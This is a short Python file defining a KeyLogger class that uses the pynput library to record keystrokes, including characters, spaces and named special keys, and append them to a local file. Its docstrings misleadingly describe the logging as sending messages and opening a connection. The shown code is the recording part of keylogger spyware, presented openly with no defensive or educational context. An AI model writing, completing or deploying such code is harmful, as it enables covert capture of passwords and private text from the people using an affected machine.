# -*- coding: utf-8 -*-
from pynput.keyboard import Key

class KeyLogger(object):
    """ Send user message """
    def __init__(self, **kwargs):
        self.word = kwargs.get('word', '')
        self.name_file = kwargs.get('name_file', 'file')
        FORMAT = '%(asctime)-15s %(message)s'

    def send(self, msg):
        """ Send message """
        self.open()
        self.write(msg)
        self.close()

    def open(self):
        """ Open connection """
        self.logging = open(self.name_file, 'a', encoding='utf-8')

    def write(self, key):
        """ Write message """
        if hasattr(key, 'char'):
            msg = '{0}'.format(key.char)
        elif key == Key.space:
            msg = ' '
        else:
            msg = '<{0}>\n'.format(key.name)

        self.logging.write(msg)

    def close(self):
        """ close connection """
        self.logging.close()
